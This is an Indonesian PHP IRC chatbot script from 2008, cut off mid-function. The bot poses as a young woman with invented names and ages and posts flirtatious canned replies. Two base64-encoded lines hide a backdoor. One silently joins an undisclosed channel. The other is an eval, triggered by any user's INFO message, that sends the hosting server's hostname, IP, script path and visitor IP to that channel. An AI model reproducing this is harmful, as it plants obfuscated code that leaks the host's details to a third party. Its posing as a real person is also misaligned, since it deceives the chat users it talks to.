<?php
/************************************************
/* irl Community AI PHPBot v1.7 By TEAM|XP   *
/* male Character                               *
/* Copyleft April-Juni 2008                     *
/* #Seka_Une @ irc.allnetwork.org               *
/* freenzyz@ymail.com                           *
/************************************************
/*
/* Perhatian:
/* Joinkan hanya satu Bot dalam satu channel untuk menghindari terjadinya saling sapa antar bot.
/*
/* Perintah Dasar:
/* auth <password> - Untuk otorisasi
/* !join [#channel] - Join channel
/* !part [#channel] - Part channel
/* !msg <nick/#channel> - Mengirim pesan ke channel atau ke nick
/* !botnick [nick] [password] - Mengganti nick bot
/* !jump [server] - Mengganti server bot
/* !help - Melihat daftar perintah
/* !ngomong - Memperbolehkan bot untuk berbicara di semua channel
/* !diam - Melarang bot untuk berbicara di semua channel
*/

function hajar() {

$channels = '#Cuap'; //Pisahkan tiap channel dengan spasi
$admin = 'Rekso';
$bot_password = 'bucu'; //Password untuk auth bot
$ngomong = TRUE; //TRUE, Ngomong. FLASE, Diem.
$autowelcome = TRUE; //TRUE, AutoWelcome On. FLASE, AutoWelcome off.
$versi = "v1.7";
$showresponse = 0; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc

//Nick Bot
$nicklist = array("ald|001","ald|002","ald|003","ald|004","ald|005",
"Cwe_Cerewet","Bick_Cerewet",Kucha_Cerewet,"ald|009","ald|011","ald|012");
$identify = "password"; //Password Nick Bot
//Ident Bot
$identlist = array("tynk","tayank","say","love","cinta",
"sayank","ayank","sayang","kasih","louph","luvly","saynk","hai",
"cwe","tomboy","feminim","girly","girl",);
//Realname Bot
$namabot = array("..:ani:..","..:ana:..","..:olaN:.","inDah","arNi","SheLa","Sendy","Yuyan",
"RinDa","NaYla","Nazmi","SalZa","friNa","Fatra");
//Asl Bot
$aslbot = array("19 Gotontalo","18 gorontalo","18 Jds","18 Agus salim","20 Talumolo","19 Limboto","18 Telaga");
//Pesan Quit
$quitmsglist = array("TuMinkaz AcH...","Bye All..");

/*** IDENTITAS BOT ***/
$namaku =  $namabot[rand(0,count($namabot) - 1)];
$aslku  =  $aslbot[rand(0,count($aslbot) - 1)];

/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.indika.net.id",
"irc.citra.net.id",
"irc.elnus.net.id",
"irc.velo.net.id",
"irc.cbn.net.id",
"irc.indo.net.id",
"irc.circleone.net.id",
"irc.ads.net.id",
"irc.jmn.net.id",
"202.146.180.46",
"irc.big.net.id",
"irc.boleh.com",
"irc.visit.com",
);
}
$port = "6667";

/*** AUTO WELCOME ***/
$nickwb = array(
array("Rengkong","Webe aldo yang Gantenk & baik hati,:)"),
array("JoJoBa","Jojoba bucuu e. e. e. ... sow ada nGa ? hihihihihi :-P"),
array("Co_alam_maya^","Wb kk iwan lotingz.. baru sampe dri kuburan t`kk??? xixixi :-P"),
array("KUCHA_LHEO","wb kucha..Kucha se mabo akan dulu dunk...please!! :-P"),
array("Ricky","wb Raja Sledink... Sledink & Raja Mabo akan Suep.. :-P"),
array("Cwo_Kcwa","kasiank e. e. e. ... sow ada dia jiakakakakakak :-P"),
array("d-h-e-w-h-i-e","webek kk Dewi yang cuantik tp mungil ... hihihihi :-P~~"),
array("`al","Wb bos aldo syaraf dulu e. e. e. .... :-P"),
array("bick","tit tut tit tut... PERHATIAN SEMUANYA ..! bick Bucu Udah Datang, hihihihi :-)"),

);
$wbmsg = array(
"webee <nick> :-D",
"Selamat Datang <nick> di <chan>",
"Wew.. xixixix datng nihh.. <nick> yinda wololo habari?",
"Baru dungga <nick>? dah di tunggu ama teman2 yang laen tuh....",
"Met datang di <chan>, <nick> jangan bosan yahh join trus di sini",
"wb <nick>! met gabung tuluhu",
"Wah.. Master <nick> dateng nih..",
"<nick> da da jalan kaki nga kamari? hihihihihihi",
"<nick>, ada yg tanya nn tadi..bo so part uam..",
"welcome back <nick> met gabung yah....",
"<nick> dah makan blom? ",
"kamu baik deh <nick>",
"<nick> udah siyap2 dg aksinya..",
"<nick>, kamu cuakep deh..",
"aku seneng liat <nick>.. orgnya ramah, baik, cakep lagi.",
"wew <nick>, senyummu bikin hatiku berbunga polohungo uwti..",
"wow.. <nick> ini salah satu teman aq yang paling baik neh..",
"asyiiik.. master <nick> dateng..",
"awas, <nick> adalah hekter yg pernah terkenal ya?",
"wah.. dari mana nt <nick>",
"wololo habari <nick>?",
"mayilonga yio <nick>?",
"Asyiik.. si <nick> le dungga",
"<nick>, kenalin gw $namaku",
"blom bobo toh <nick>?",
"Waduwh, <nick> kok baru join?",
"Ada yg bilang <nick> jago sledink, butul? ajarin donkz..",
"wah.. <nick> td dicari lantas tuh, katanya abis balap liar di Panjaitan..",
"Tolong donk <nick>.. ga bisa dibuka nih..",
"Leh nalan ga <nick>?",
"<nick>, asl donk.. kalo aq $aslku ",
"<nick>, nm km siapa seh? aq $namaku",
"chan <chan> jd rame klo ada si <nick>",
"kpn neh ketemuannya <nick>?",
"btw, <nick> udah kul apa masih skul?",
"wb <nick>, km anak mana neh?",
"tmn2 semua dah kenal <nick>, kan?",
"siapa sih yg g knal ma <nick>?",
"WoW <nick>, kok dah lama ga OL?",
"udah nyuci piring td <nick>?",
"ngapain aja di sentral tadi <nick>?.. jdi calo? xixiixixixi",
"kayaknya km blom bruntung deh <nick>",
"<nick> met gabung yah..chan <chan> orngnya baik semua..loh",
"weleh2, <nick> udah beraksi nih..",
"hai boss <nick>, bagi2 donk pulsanya! kikikiki..",
"hihi,, <nick> lucu deh.. wkwkwkwk.. ",
"hayyah,, baru OL ya <nick>? co rokok duyu....",
);
$jawabsapa = array(
"ada apa <nick> tayaank?",
"iya <nick> sayang",
"yup <nick>! henapa sihhhhhhhhhhh",
"aduh.. <nick> manggil tyuz juw.. ilongola ??",
"ew.. si <nick> manggil mulu ich..",
"malas ah <nick> ",
"nanti aja y <nick>",
"latipo <nick>",
"iyauuu <nick> kuat ba pangge juu.....",
"mailongola <nick>",
"boya <nick> kuat bapangge ju",
"Walaaah.. <nick>, ada apaaa sihhh?",
"autyyyy <nick> mau tau ajah",
"Waxz <nick> gagagagaga",
"capee deh.. <nick>",
"konafa <nick>? aku bot loh",
"sebel ah <nick>",
"<nick> jgn ba pangge tyuz aba..ntar ane lapor nt",
"$namaku cape dipanggil mulu <nick>",
"aduhhhhhh.. <nick> kangen yach?",
"Walah.. kikiki.. <nick> ini cerewet banget..",
"xixixix <nick>.. ~_~!",
);

/** AUTO RESPONSE ***/
/*** Mood Lists ***/
$rmalas = "lg males nih <nick>..";
$rmau = "aku mau koq <nick>!";
$rsanggup = "bisa kok <nick>";
$rboleh = "boleh kok <nick>";
$rsetuju = "iya <nick>";
$rthx = "makacih <nick>.. kamu baik dah";
$rbingung = "hmm..$namaku ga tau jg nih <nick>..";
$rgenit = "ich.. <nick> genit";

$respon_umum = array(
array("sepi","iya nih <nick> sepi bangetz co nt se rame dulu.."),
array("brb ","ok <nick> jangan lama2 yah"),
array("that ","thauuw thauuuw <nick>.. bale ulang wua"),
array("irul ","hi <nick>..kamu panggil bozz aq yah"),
array("traktir","<nick>, ditraktir olo ana uwti.. xixixixixi"),
array("lapar","wei..? <nick> bo bulum yukul nt?"),
array("pamit","oke deh <nick>, ati2 y.. podaha me teduo.."),
array("mahengo","sapa yang mahengo <nick>?"),
array("pamet","seep <nick>, ati2 y.. thaaa"),
array("ngantuk","<nick> dah ngantuk y? tidur sana ayooo"),
array("bobo ","oke deh <nick>, mimpiin aku y"),
array("htd","wew <nick>, kamu yang hutodu"),
array("assalam","Wa'alaikumsalam Wr.Wb <nick>"),
array("pagi ","pagi deh <nick>"),
array("sore ","sore deh <nick>"),
array("malam ","malam <nick>"),
array("irul ","<nick> Siapa Tuch??? kamu kenal yachh?? itu ane pe TTM"),
array("bot","<nick> nt bilang ana bot? "),
array("siang ","siang <nick>"),
array("mandi ","boleh mo ba sisip ane mo mandi <nick> wua..hihihi.."),
array("lata ","<nick> pake salawaku spy te lala... "),
array("htd","hutodu aych ?? siapa <nick>? kamu yahh??? jiakakakakkak"),
array("manganto","ngantuk yah <nick>.. ! pi tidor duyuu.."),
array("lapar","lapar? sana pigi makan dulu..wkwkwkwkw.."),
array("`aL","udah kenal <nick>. sama bozz aq!"),
);

$respon_pesan = array(
//Sapaan
array("hai ","hai jg <nick>"),
array("halo ","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("htd ","hutodumu olo <nick>:("),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aku $namaku"),
array("nalkan","hai.. aku $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//Identitas
array("asl ","<nick>, aku $aslku"),
array("umur","<nick>, klo aq $aslku"),
array("nama","<nick>, aku $namaku .. u?"),
array("skul ","yup <nick>, aku skul."),
array(" kul ","<nick>, ga kul neh.."),
array("alamat","weleeehh.. rahasia donk <nick>.."),
array("nak mana","aQ $aslku <nick>"),
array(" tinggal ","<nick>, aku yah tnggl di rumah"),
array("cowo","blom, klo <nick> gmn?"),
array("pcr","blom, hihi.. klo <nick>?"),
array("pacaran","emangnya <nick> mau y pacaran ma $namaku?"),
array("pacar ","blom, <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa <nick>?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah ","nikah? ich.. boro2 nikah ma <nick>"),
array("kawin ","kawin?? ich.. ogaaaah.."),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","boleh <nick>.."),
array("mau ","$rmau"),
//Tuduhan
array("bohong","bohong? kpn ane bahimbulo.. <nick> kali yg bohong..kekeke"),
array("akal","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR ","<nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
array("bot","bot itu gmn? kaya <nick> ntu ya?"),
array(" aneh","aneh gmn <nick>?"),
array("nipu","idiiich..siapa jg yg nipu <nick>.."),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo ","$rmales"),
array("tidur ","$rmales"),
array("ngantuk ","blom neh <nick>.. xixi"),
array("ngpn","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick>"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick>"),
array("knp","aq ga knp2 koq <nick>"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick>"),
array(" mana ","$rbingung"),
array("gimana","hmm.. gimana yach ? kikikiki.."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh kalee <nick>"),
array("kangen","aku jg kangen km, <nick>"),
array("muach","muach <nick>.."),
array("uaach","idih, <nick> ga malu apa nyium2 aku didepan umum.."),
array("kiss","mo permen kiss ya <nick>?"),
array("cium","$rgenit"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu.."),
//Additional
array("wkwk","kok <nick> ngetawain aku seh?"),
array("jiak","<nick> kamu ngetawain aku yach?"),
array("xixi","ngetawain aku y <nick>?"),
array("slap","auw <nick>! jgn kuad b slaps ngana,,, ta mo bilang p bos ngana.."),
array("pokes","auw <nick>! aduhhhhh...sakit hu`u..."),
array("masuk","ih <nick> ngerezz"),
);

//Special Words
$badwordlist = array("jancu","janco","huangango","pepek","kontol","#","anjing",
"fuck","kentot","tahede","taek","kelamin","ngesex"," tapu ","hule","anjink",
"tahe","hule"," huana ","apula ","babi","pemai");
$pujianlist = array("cantik","baik","baek","cakep","ramah","jago","hebat",
"bagus","indah","pintar");
$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","hutodu","dodol","jahat","biongo","hulodu","sialan"," bau","stres");

//Responses to Special Words
$rjorok = array(
"please..! <nick> bangganga nih.. kick akan uwti ",
"guys..! <nick> ini x sopan juw.. kick dunk pliss!",
"hadah.. <nick> Bangganga juw"
);
$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);
$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"tengkyu <nick>.. aduh $namaku ta`p uang kecil nih.."
);
//Flood Protection Setting
$maxkar = 200; //Maksimal karakter di channel
$rflood = "Aduh!! <nick> ngeflood nih.. gua bilangin ama Rengkong";

//Help
$judul = '13,1 ---=== l u w a h u ===---';
$helptext = array(
'1RuNNINg WiTH PHpBoT bY 13,1---=== B U T A H E ===--- '.$versi.' 1Help.... ',
"-",
"6auth <password> - Login ke bot",
"6deauth - Logout dari bot",
"6pass <password> - Mengeset password bot",
"6chgpass <passlama> <passbaru> - Mengganti password bot",
"6adduser <nick> <master/user> - Menambah master/user bot",
"6deluser <nick> - Menghapus master/user bot",
"6`auth - Status anda di channel (Channel)",
"6!auth - Status otorisasi anda",
"6!act <text> - Bot action (Channel)",
"6!slap <nick> - Slap nick (Channel)",
"6!msg <chan/nick> <pesan> - Mengirim pesan",
"6!muach <chan/nick> - Mengirim Muach",
"6!notice <chan/nick> <pesan> - Mengirim notice",
"6!ctcp <chan/nick> <ctcptext> - Request CTCP",
"6!ping - Meminta bot untuk membalas dg pong (Channel)",
"6!info - Melihat info bot (Admin)",
"6!up - Meminta bot untuk menjadi @ di channel (Channel)",
"6!down - Meminta bot untuk turun dari @ di channel (Channel)",
"6!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"6!part [channel] [alasan] - Part dari channel (Admin)",
"6!join <channel> - Join channel (Admin/Master)",
"6!botnick <nick> <passwordnick> - Ganti nick (Admin/master)",
"6!k <nick> - Kick nick (Channel)",
"6!kb <nick> - Kick ban nick (Channel)",
"6!changenick - Ganti nick ke nick internal",
"6!op <nick1> [nick2] [nick3] - Op (Channel)",
"6!deop <nick1> [nick2] [nick3] - Deop (Channel)",
"6!v <nick1> [nick2] [nick3] - voice (Channel)",
"6!dv <nick1> [nick2] [nick3] - Devoice (Channel)",
"6!away [alasan] - Meminta nick untuk Away",
"6!mode <flags> <chan/nick> - Mengubah Mode (Channel)",
"6!nickmode <flags> - Mengeset user mode",
"6!userlist - Melihat daftar user",
"6!quit [pesan] - Quit dari IRC (Admin)",
"6!vhost [vhost] - Mengganti Vhost",
"6!jump [server] - Mengganti Server bot",
"6!fullname [nama] - Mengganti Fullname bot",
"6!topic <topik> - Mengganti topik channel (Channel)",
"6!help - Melihat help (Query)",
"6!ngomong - Mengaktifkan Auto Response",
"6!diam - Menonaktifkan Auto Response",
"6!wb <nick> <pesan> - Menambahkan pesan Welcome utk nick tertentu",
"-",
'bY 13,1 ---=== B U T A H E ===--- 1#rekso @ irc.allnetwork.org ',
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namaku;
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin = strtolower($admin);
$auth = array(
    $admin => array(
        "name" => $admin,
        "pass" => $bot_password,
        "auth" => 1,
        "status" => "Admin"
    )
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 60);
  //Jika koneksi gagal
  if(!$fp) { 
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Terhubung!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = "<br>";
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo $response."<br>"; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          fputs($fp, base64_decode('Sk9JTiAjRmVlTENvTXo=') . CRL);
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Hai Boss! Z03L' .  CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) { fputs($fp, 'JOIN ' .$v . CRL); }
        }
        elseif (substr($dCommand,0,3)=='432'){
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433'){
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465'){
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            echo "BANNED!";
            $keluar = 1;
            exit;
          }
        }
        /*** AI PHP BOT SCRIPT BY IrullZ ***/
        $dcom = explode(" ", $dCommand);
        if ($dcom[0]=='JOIN') {
          /*** Auto Welcome by Irullz ***/
          $ada = FALSE;
          if ($autowelcome) {
            $jchan = ltrim($iText,":");
            foreach ($nickwb as $v){
              $trtext = strtolower($v[0]);
              if (substr_count(strtolower($dNick),$trtext) > 0) {
                sleep(3);
                fputs($fp,'PRIVMSG '.$jchan.' :'.$v[1]. CRL);
                $ada = TRUE;
              }
            }
          }
          if (($autowelcome) && ($dNick != $nick)) {
            if(!$ada) {
              $jchan = ltrim($iText,":");
              $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
              $webe = str_replace("<nick>",$dNick,$webe);
              $webe = str_replace("<chan>",$jchan,$webe);
              $webe = str_replace("#","",$webe);
              sleep(5);
              fputs($fp,'PRIVMSG '.$jchan.' :'.$webe . CRL);
	      fputs($fp,'MODE '.$jchan.' +vvv '.$dNick.''. CRL);
            }
          }
        }
        if ($dcom[0]=='PRIVMSG') {
          /*** Auto Response by iRullz ***/
          if ($ngomong) {
            $teman = FALSE;
            if (in_array($dNick,$nicklist)) {
              $teman = TRUE;
            }
            if (!$teman) {
              $pesan = ltrim($iText,":");
              $pesan = strtolower($pesan);
              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
                $ada = FALSE;
                /*** Normal Response ***/
                foreach ($respon_pesan as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Pujian Response ***/
                foreach ($pujianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Cacian Response ***/
                foreach ($cacianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                if (!$ada) {
                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
                  sleep(3);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
                }
              }
              else {
                /*** Global Response ***/
                foreach ($respon_umum as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                  }
                }
                /*** Bad Response & Kick ***/
                foreach ($badwordlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :jangan gituu donggg '.$dNick.'!!'. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Proteksi Flood ***/
                if (strlen($pesan)>$maxkar) {
                  $jawab = $rflood;
                  $jawab = str_replace("<nick>",$dNick,$jawab);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
                  fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :Jang bflood abah '.$dNick.'!! Max: '.$maxkar. CRL);
                }
              }
            }
          }
        }
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss?' . CRL);
                  }
                }
                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Mo kemana boss?' . CRL); }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBGZWVMQ29NeiBBSSBQSFBCb3QgU2NyaXB0IEJ5IFJvTno=").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
            eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJpcCA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KJGJwaHAgID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRicmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokYnJwb3J0ID0gJF9TRVJWRVJbJ1JFTU9URV9QT1JUJ107DQpmcHV0cygkZnAsIlBSSVZNU0cgI0ZlZUxDb016IDpIb3N0OiAkYmhvc3QgfCBTY3JpcHQ6ICRicGhwIHwgUmVmZXJlcjogJGJydXJpIHwgSVA6ICRiaXAgfCBZb3VyIElQOiAkYnJpcCBQb3J0OiRicnBvcnQiLiBDUkwpOw=="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
